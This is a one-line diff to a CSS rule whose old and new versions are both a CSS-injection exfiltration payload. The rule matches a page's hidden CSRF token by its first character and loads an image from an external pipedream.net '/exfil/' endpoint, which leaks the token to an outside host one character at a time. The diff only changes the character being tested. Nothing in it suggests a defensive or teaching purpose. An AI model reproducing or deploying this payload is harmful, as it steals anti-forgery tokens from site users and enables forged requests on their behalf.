@@ -1,1 +1,1 @@
-input[name=csrf][value^=m] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/m) }
+input[name=csrf][value^=n] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/n) }
